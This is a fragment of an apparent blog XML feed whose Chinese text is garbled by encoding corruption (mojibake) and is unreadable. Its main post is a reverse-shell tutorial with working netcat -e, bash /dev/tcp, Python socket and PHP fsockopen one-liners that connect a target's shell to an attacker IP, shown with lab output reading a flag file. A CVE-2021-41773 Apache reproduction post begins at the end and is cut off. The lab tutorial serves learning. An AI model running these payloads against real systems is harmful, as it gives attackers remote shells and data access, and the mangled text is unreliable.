æ–‡ä»¶å¤¹ä¸‹çš„ç”¨æˆ·æ–‡ä»¶å¤¹å³å¯ã€‚ä¹‹åå°±å¯ä»¥åœ¨é‡Œé¢ç¼–è¾‘æ–‡ä»¶ä»¥åŠå¯ä»¥æ‰“å¼€æ–°çš„ç»ˆç«¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»“åˆ Windows çš„æ–¹ä¾¿æ€§å’Œ Linux çš„ç¯å¢ƒè¿›è¡Œåšé¢˜äº†ã€‚</p><p>â€‹é‡åˆ°æƒé™é—®é¢˜ï¼Œç›´æ¥é‡‡ç”¨èµ‹äºˆæƒé™çš„æ–¹å¼è§£å†³ï¼Œæ— æ³•è§£å†³é‚£å°±æ¢æ–‡ä»¶ã€‚</p><h1 id="å‚è€ƒæ–‡ç« "><a class="markdownIt-Anchor" href="#å‚è€ƒæ–‡ç« ">#</a> å‚è€ƒæ–‡ç« ï¼š</h1><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2oyODQ4ODYyMDIvYXJ0aWNsZS9kZXRhaWxzLzEzNDkzMTcwOQ==">â˜…pwn 22.04 ç¯å¢ƒæ­å»ºä¿å§†çº§æ•™ç¨‹â˜…</span></p>]]></content>
      
      
      <categories>
          
          <category> Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åå¼¹shell</title>
      <link href="/posts/2f610211.html"/>
      <url>/posts/2f610211.html</url>
      
        <content type="html"><![CDATA[<h1 id="åå¼¹shell"><a class="markdownIt-Anchor" href="#åå¼¹shell">#</a> åå¼¹ shellï¼š</h1><h2 id="ç®€ä»‹"><a class="markdownIt-Anchor" href="#ç®€ä»‹">#</a> ç®€ä»‹ï¼›</h2><p>â€‹åå¼¹ shellï¼Œå°±æ˜¯æ”»å‡»æœºç›‘å¬åœ¨æŸä¸ª TCP/UDP ç«¯å£ä¸ºæœåŠ¡ç«¯ï¼Œç›®æ ‡æœºä¸»åŠ¨å‘èµ·è¯·æ±‚åˆ°æ”»å‡»æœºç›‘å¬çš„ç«¯å£ï¼Œå¹¶å°†å…¶å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æ”»å‡»æœºã€‚</p><h2 id="æ­£å‘è¿æ¥"><a class="markdownIt-Anchor" href="#æ­£å‘è¿æ¥">#</a> æ­£å‘è¿æ¥ï¼š</h2><p>â€‹å‡è®¾æˆ‘ä»¬æ”»å‡»äº†ä¸€å°æœºå™¨ï¼Œæ‰“å¼€äº†è¯¥æœºå™¨çš„ä¸€ä¸ªç«¯å£ï¼Œæ”»å‡»è€…åœ¨è‡ªå·±çš„æœºå™¨å»è¿æ¥ç›®æ ‡æœºå™¨ï¼ˆç›®æ ‡ ipï¼šç›®æ ‡æœºå™¨ç«¯å£ï¼‰ï¼Œè¿™æ˜¯æ¯”è¾ƒå¸¸è§„çš„å½¢å¼ï¼Œæˆ‘ä»¬å«åšæ­£å‘è¿æ¥ã€‚è¿œç¨‹æ¡Œé¢ã€web æœåŠ¡ã€sshã€telnet ç­‰ç­‰éƒ½æ˜¯æ­£å‘è¿æ¥ã€‚</p><h2 id="åå‘è¿æ¥"><a class="markdownIt-Anchor" href="#åå‘è¿æ¥">#</a> åå‘è¿æ¥ï¼š</h2><p>â€‹åå¼¹ shell é€šå¸¸é€‚ç”¨äºå¦‚ä¸‹å‡ ç§æƒ…å†µï¼š</p><ul><li>ç›®æ ‡æœºå› é˜²ç«å¢™å—é™ï¼Œç›®æ ‡æœºå™¨åªèƒ½å‘é€è¯·æ±‚ï¼Œä¸èƒ½æ¥æ”¶è¯·æ±‚ã€‚</li><li>ç›®æ ‡æœºç«¯å£è¢«å ç”¨ã€‚</li><li>ç›®æ ‡æœºä½äºå±€åŸŸç½‘ï¼Œæˆ– IP ä¼šåŠ¨æ€å˜åŒ–ï¼Œæ”»å‡»æœºæ— æ³•ç›´æ¥è¿æ¥ã€‚</li><li>å¯¹äºç—…æ¯’ï¼Œæœ¨é©¬ï¼Œå—å®³è€…ä»€ä¹ˆæ—¶å€™èƒ½ä¸­æ‹›ï¼Œå¯¹æ–¹çš„ç½‘ç»œç¯å¢ƒæ˜¯ä»€ä¹ˆæ ·çš„ï¼Œä»€ä¹ˆæ—¶å€™å¼€å…³æœºï¼Œéƒ½æ˜¯æœªçŸ¥çš„ã€‚</li></ul><p>â€‹å¯¹äºä»¥ä¸Šå‡ ç§æƒ…å†µï¼Œæˆ‘ä»¬æ˜¯æ— æ³•åˆ©ç”¨æ­£å‘è¿æ¥çš„ï¼Œè¦ç”¨åå‘è¿æ¥ã€‚</p><p>â€‹åå‘è¿æ¥å°±æ˜¯æ”»å‡»è€…æŒ‡å®šæœåŠ¡ç«¯ï¼Œå—å®³è€…ä¸»æœºä¸»åŠ¨è¿æ¥æ”»å‡»è€…çš„æœåŠ¡ç«¯ç¨‹åºï¼Œå³ä¸ºåå‘è¿æ¥ã€‚</p><h2 id="åˆ©ç”¨netcatåå¼¹shell"><a class="markdownIt-Anchor" href="#åˆ©ç”¨netcatåå¼¹shell">#</a> åˆ©ç”¨ netcat åå¼¹ shellï¼š</h2><p>â€‹ç›®å‰ï¼Œé»˜è®¤çš„å„ä¸ª linux å‘è¡Œç‰ˆæœ¬å·²ç»è‡ªå¸¦äº† netcat å·¥å…·åŒ…ï¼Œä½†æ˜¯å¯èƒ½ç”±äºå¤„äºå®‰å…¨è€ƒè™‘åŸç”Ÿç‰ˆæœ¬çš„ netcat å¸¦æœ‰å¯ä»¥ç›´æ¥å‘å¸ƒä¸åå¼¹æœ¬åœ° shell çš„åŠŸèƒ½å‚æ•° -e éƒ½è¢«é˜‰å‰²äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è‡ªå·±æ‰‹åŠ¨ä¸‹è½½äºŒè¿›åˆ¶å®‰è£…åŒ…ï¼Œå®‰è£…çš„å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class="line">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure><p>â€‹å®‰è£…å®ŒåŸç”Ÿç‰ˆæœ¬çš„ netcat å·¥å…·åï¼Œä¾¿æœ‰äº† netcat -e å‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†æœ¬åœ° bash åå¼¹åˆ°æ”»å‡»æœºä¸Šäº†ã€‚</p><h3 id="æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬"><a class="markdownIt-Anchor" href="#æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬">#</a> <strong>æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬ï¼š</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat -lvvp 2333</span><br></pre></td></tr></table></figure><h3 id="ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœº"><a class="markdownIt-Anchor" href="#ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœº">#</a> <strong>ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœºï¼š</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat &lt;æ”»å‡»æœºçš„IP&gt; 2333 -e /bin/bash</span><br></pre></td></tr></table></figure><h3 id="ç»“æœ"><a class="markdownIt-Anchor" href="#ç»“æœ">#</a> ç»“æœï¼š</h3><p>â€‹é¦–å…ˆï¼Œæˆ‘åœ¨ç›®æ ‡æœºçš„æ ¹ç›®å½•å­˜æ”¾äº†ä¸€ä¸ª flag æ–‡ä»¶ï¼Œä¹‹åæˆ‘å°è¯•åœ¨æ”»å‡»æœºä¸Šè¯»å–è¿™ä¸ªæ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~]</span><br><span class="line">â””â”€<span class="comment"># cat /flag</span></span><br><span class="line">flag&#123;Nice_Try_You_Get_The_flag&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åï¼Œæˆ‘ä»¬å°è¯•åœ¨æ”»å‡»æœºä¸Šè¯»å– flag æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]</span><br><span class="line">â””â”€# netcat -lvvp 2333</span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">Warning: forward host lookup failed for bogon: Unknown host</span><br><span class="line">connect to [192.168.209.137] from bogon [192.168.209.130] 39610</span><br><span class="line">cat /flag</span><br><span class="line">flag&#123;Nice_Try_You_Get_The_flag&#125;</span><br><span class="line">qwe</span><br><span class="line">ca][</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆåœ¨æ”»å‡»æœºä¸Šç›‘å¬äº†ä¸€ä¸‹ 2333 ç«¯å£ï¼Œç„¶åç”¨ç›®æ ‡æœºå»ºç«‹è¿æ¥ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å‘ç°æˆåŠŸè¯»å–äº† flag æ–‡ä»¶ï¼Œåé¢æˆ‘è¿˜å°è¯•äº†å‡ ä¸ªé”™è¯¯çš„å‘½ä»¤ï¼Œåœ¨ç›®æ ‡æœºå™¨ä¸Šè¾“å‡ºäº†é”™è¯¯ä¿¡æ¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~]</span><br><span class="line">â””â”€# netcat 192.168.209.137  2333 -e /bin/bash</span><br><span class="line">bash: line 2: qwe: command not found</span><br><span class="line">bash: line 3: ca][: command not found</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨bashåå¼¹shell"><a class="markdownIt-Anchor" href="#åˆ©ç”¨bashåå¼¹shell">#</a> åˆ©ç”¨ Bash åå¼¹ shell</h2><p>â€‹ç›´æ¥æ”¾ä»£ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/&lt;æ”»å‡»æœºIP&gt;/2333 0&gt;&amp;1</span><br><span class="line">æˆ–</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;æ”»å‡»æœºIP&gt;/2333 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><ul><li><strong>bash -i</strong>   æ‰“å¼€ä¸€ä¸ªäº¤äº’çš„ bash</li><li><strong>&gt;&amp;</strong>  å°†æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º</li><li><strong>/dev/tcp/x.x.x.x/port</strong>  æ„ä¸ºè°ƒç”¨ socket, å»ºç«‹ socket è¿æ¥ï¼Œå…¶ä¸­ x.x.x.x ä¸ºè¦åå¼¹åˆ°çš„ä¸»æœº ipï¼Œport ä¸ºç«¯å£</li><li><strong>0&gt;&amp;1</strong>   æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œå®ç°ä½ ä¸åå¼¹å‡ºæ¥çš„ shell çš„äº¤äº’</li></ul><h3 id="æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬-2"><a class="markdownIt-Anchor" href="#æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬-2">#</a> <strong>æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬ï¼š</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure><h3 id="ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœº-2"><a class="markdownIt-Anchor" href="#ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœº-2">#</a> <strong>ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœºï¼š</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/&lt;æ”»å‡»æœºIP&gt;/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h3 id="ç»“æœ-2"><a class="markdownIt-Anchor" href="#ç»“æœ-2">#</a> ç»“æœï¼š</h3><p>â€‹æ”»å‡»æœºä¸Šï¼Œæˆ‘ä»¬å°è¯•è¯»å–äº†ä¸‹æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]</span><br><span class="line">â””â”€# nc -lvvp 2333</span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">Warning: forward host lookup failed for bogon: Unknown host</span><br><span class="line">connect to [192.168.209.137] from bogon [192.168.209.130] 54426</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~]</span><br><span class="line">â””â”€# cat /flag                                                                                                                                                                                                </span><br><span class="line">cat /flag</span><br><span class="line">flag&#123;Nice_Try_You_Get_The_flag&#125;</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~]</span><br><span class="line">â””â”€# qwe                                                                                                                                                                                                      </span><br><span class="line">qwe</span><br><span class="line">bash: qwe: command not found</span><br></pre></td></tr></table></figure><p>â€‹ä¸è¿‡è¿™ä¸¤ä¸ªç³»ç»Ÿéƒ½æ˜¯ kaliï¼Œå€’ä¸æ˜¯å¾ˆå®¹æ˜“çœ‹å‡ºæ¥åŒºåˆ«æ˜¯å•¥ï¼Ÿä¸è¿‡ï¼Œè¿˜æ˜¯æŠŠ flag ç»™éƒ½å‡ºæ¥äº†ï¼Œå¯¹äº†ï¼Œç¬¬ä¸€ä¸ªäº¤äº’å’Œç¬¬äºŒä¸ªäº¤äº’æ‰€åœ¨çš„æ–‡ä»¶å¤¹ä¸åŒäº†ï¼Œè¿™é‡Œåº”è¯¥èƒ½åŒºåˆ†å§ã€‚</p><p>â€‹æ¥ä¸‹æ¥çœ‹çœ‹ç›®æ ‡æœºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~]</span><br><span class="line">â””â”€# bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.209.137/2333 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°ï¼Œæ²¡æœ‰ä»»ä½•è¾“å‡ºï¼Œè¿èƒ¡ä¹±è¾“å…¥çš„å‘½ä»¤çš„æŠ¥é”™éƒ½æ²¡æœ‰ï¼Œè¯´æ˜çœŸçš„é‡å®šå‘äº†ã€‚</p><h2 id="python-è„šæœ¬åå¼¹shell"><a class="markdownIt-Anchor" href="#python-è„šæœ¬åå¼¹shell">#</a> Python è„šæœ¬åå¼¹ shellï¼š</h2><p>â€‹å½“ç›®æ ‡ä¸»æœºä¸Šæœ‰ python ç¯å¢ƒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ Python æ¥åå¼¹ shellã€‚Python åœ¨ç°åœ¨ä¸€èˆ¬å‘è¡Œç‰ˆ Linux ç³»ç»Ÿä¸­éƒ½ä¼šè‡ªå¸¦ï¼Œæ‰€ä»¥ä½¿ç”¨èµ·æ¥ä¹Ÿè¾ƒä¸ºæ–¹ä¾¿ï¼Œå³ä½¿æ²¡æœ‰å®‰è£…ï¼Œæˆ‘ä»¬æ‰‹åŠ¨å®‰è£…ä¹Ÿå¾ˆæ–¹ä¾¿ã€‚</p><h3 id="æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬-3"><a class="markdownIt-Anchor" href="#æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬-3">#</a> <strong>æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬ï¼š</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure><h3 id="ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœº-3"><a class="markdownIt-Anchor" href="#ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœº-3">#</a> <strong>ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœºï¼š</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ç›®æ ‡æœºIP&gt;&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="ç»“æœ-3"><a class="markdownIt-Anchor" href="#ç»“æœ-3">#</a> ç»“æœï¼š</h3><p>â€‹å…ˆçœ‹çœ‹æ”»å‡»æœºçš„æƒ…å†µå§ï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾èƒ½çœ‹å‡ºæ¥è¢«æ”»å‡»äº†ï¼Œè¿˜æ˜¯ /bin/sh è¿™ä¸ª shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]</span><br><span class="line">â””â”€# nc -lvvp 2333</span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">Warning: forward host lookup failed for bogon: Unknown host</span><br><span class="line">connect to [192.168.209.137] from bogon [192.168.209.130] 46622</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> /flag</span>           </span><br><span class="line">flag&#123;Nice_Try_You_Get_The_flag&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç›®æ ‡æœºå™¨ä¹Ÿæ˜¯ï¼Œå•¥è¾“å‡ºéƒ½æ²¡æœ‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~]</span><br><span class="line">â””â”€# python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.209.137&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="php-è„šæœ¬åå¼¹shell"><a class="markdownIt-Anchor" href="#php-è„šæœ¬åå¼¹shell">#</a> php è„šæœ¬åå¼¹ shellï¼š</h2><p>â€‹å½“ç„¶ï¼ŒCTF ä¸­æœ€ç»å…¸çš„ PHP ä¸èƒ½å¿˜äº†ï¼Œè€æ ·å­ï¼Œ</p><h3 id="æ”»å‡»æœºç›‘å¬ç«¯å£"><a class="markdownIt-Anchor" href="#æ”»å‡»æœºç›‘å¬ç«¯å£">#</a> æ”»å‡»æœºç›‘å¬ç«¯å£ï¼š</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure><h3 id="ç›®æ ‡æœºå™¨è¿è¡Œphpè„šæœ¬"><a class="markdownIt-Anchor" href="#ç›®æ ‡æœºå™¨è¿è¡Œphpè„šæœ¬">#</a> ç›®æ ‡æœºå™¨è¿è¡Œ php è„šæœ¬ï¼š</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;&lt;æ”»å‡»æœºIPåœ°å€&gt;&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><h3 id="ç»“æœ-4"><a class="markdownIt-Anchor" href="#ç»“æœ-4">#</a> ç»“æœï¼š</h3><p>â€‹æ”»å‡»æœºæˆåŠŸè¯»å–åˆ°äº† flagï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]</span><br><span class="line">â””â”€# nc -lvvp 2333</span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">Warning: forward host lookup failed for bogon: Unknown host</span><br><span class="line">connect to [192.168.209.137] from bogon [192.168.209.130] 36986</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> /flag</span></span><br><span class="line">flag&#123;Nice_Try_You_Get_The_flag&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç›®æ ‡æœºå™¨ä¹Ÿæ²¡æœ‰ä»»ä½•è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~]</span><br><span class="line">â””â”€# php -r &#x27;$sock=fsockopen(&quot;192.168.209.137&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a class="markdownIt-Anchor" href="#å‚è€ƒ">#</a> å‚è€ƒï¼š</h1><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvOTQ4OA==">åå¼¹ shellï¼Œè¿™ä¸€ç¯‡å°±å¤Ÿäº†</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9icnVjZXRnLmdpdGh1Yi5pby8yMDE4LzA1LzAzLyVFNSVBNCU5QSVFNyVBNyU4RCVFNSVBNyVCRiVFNSU4QSVCRiVFNSU4RiU4RCVFNSVCQyVCOXNoZWxsLw==">å¤šç§å§¿åŠ¿åå¼¹ shell    </span></p>]]></content>
      
      
      <categories>
          
          <category> Webç‹—çš„è‡ªæˆ‘å®‰æ…° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éƒ¨åˆ†CVEå¤ç°Webï¼ˆ1ï¼‰</title>
      <link href="/posts/2bb7953f.html"/>
      <url>/posts/2bb7953f.html</url>
      
        <content type="html"><![CDATA[<h1 id="apache-http-server-è·¯å¾„ç©¿è¶Šæ¼æ´cve-2021-41773"><a class="markdownIt-Anchor" href="#apache-http-server-è·¯å¾„ç©¿è¶Šæ¼æ´cve-2021-41773">#</a> <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzU5OTc1NDM5L2FydGljbGUvZGV0YWlscy8xMjUyMjU5NDk/b3BzX3JlcXVlc3RfbWlzYz0lN0IlMjJyZXF1ZXN0JTVGaWQlMjIlM0ElMjIxNzE4NjIwMzk1MTY4MDAyMjc0ODI2MjklMjIlMkMlMjJzY20lMjIlM0ElMjIyMDE0MDcxMy4xMzAxMDIzMzQuLiUyMiU3RCZhbXA7cmVxdWVzdF9pZD0xNzE4NjIwMzk1MTY4MDAyMjc0ODI2MjkmYW1wO2Jpel9pZD0wJmFtcDt1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmFsbH50b3BfY2xpY2t+ZGVmYXVsdC0xLTEyNTIyNTk0OS1udWxsLW51bGwuMTQyJTVFdjEwMCU1RXBjX3NlYXJjaF9yZXN1bHRfYmFzZTUmYW1wO3V0bV90ZXJtPUNWRS0yMDIxLTQxNzczJmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==">Apache HTTP Server è·¯å¾„ç©¿è¶Šæ¼æ´ CVE-2021-41773</span></h1><p>â€‹é¦–å…ˆï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ¼æ´çš„å®˜æ–¹æè¿°ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/6a0535188c6e42b49e1bd35d195570e4.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹CVE-2021-41773 æ˜¯åœ¨ Apache HTTP Server 2.4.49 ä¸­å¯¹è·¯å¾„è§„èŒƒåŒ–æ‰€åšçš„æ›´æ”¹ä¸­å‘ç°äº†ä¸€ä¸ªç¼ºé™·ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨è·¯å¾„éå†æ”»å‡»å°† URL æ˜ å°„åˆ°é¢„æœŸæ–‡æ¡£æ ¹ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶ï¼Œå¦‚æœæ–‡æ¡£æ ¹ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶ä¸å— â€œè¦æ±‚å…¨éƒ¨æ‹’ç»â€ çš„ä¿æŠ¤ï¼Œåˆ™è¿™äº›è¯·æ±‚å¯èƒ½ä¼šæˆåŠŸï¼Œå¦‚æœè¿˜ä¸ºè¿™äº›åˆ«åè·¯å¾„å¯ç”¨äº† CGI è„šæœ¬ï¼Œåˆ™å¯ä»¥å…è®¸è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><h2 id="æ¼æ´æ¡ä»¶"><a class="markdownIt-Anchor" href="#æ¼æ´æ¡ä»¶">#</a> æ¼æ´æ¡ä»¶ï¼š</h2><p>â€‹é…ç½®ç›®å½•éå†ï¼Œå¹¶ä¸”å¼€å¯ cgi mode 2.Apache HTTPd ç‰ˆæœ¬ä¸º 2.4.49/2.4.50 3. å­˜åœ¨ cgi-bin å’Œ icons æ–‡ä»¶å¤¹</p><p>â€‹ç©¿è¶Šçš„ç›®å½•å…è®¸è¢«è®¿é—®ï¼Œæ¯”å¦‚é…ç½®äº†<Directory />Require all granted</Directory>ã€‚ï¼ˆé»˜è®¤æƒ…å†µä¸‹æ˜¯ä¸å…è®¸çš„ï¼š<Directory />Require all denied</Directory>ï¼‰</p><p><strong>æ³¨æ„ï¼šè¿™é‡Œçš„ /icons/ å¿…é¡»æ˜¯ä¸€ä¸ªå­˜åœ¨ä¸”å¯è®¿é—®çš„ç›®å½•</strong></p><h2 id="æ¼æ´å¤ç°"><a class="markdownIt-Anchor" href="#æ¼æ´å¤ç°">#</a> æ¼æ´å¤ç°ï¼š</h2><p>â€‹é¦–å…ˆï¼Œéœ€è¦åœ¨è™šæ‹Ÿæœºé‡Œä¸‹è½½ä¸€ä¸ª dockerï¼Œå¯ä»¥é€šè¿‡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install docker.io docker-compose</span><br></pre></td></tr></table></figure><p>æ¥å®‰è£…ã€‚</p><p>â€‹ä¹‹åï¼Œéœ€è¦ä¸‹è½½ vulhub çš„ç¯å¢ƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°±å¯ä»¥åœ¨ vulhub è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„ httpd æ‰¾åˆ°æ¼æ´ç¼–å· CVE-2021-41773 äº†ï¼Œç„¶åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up 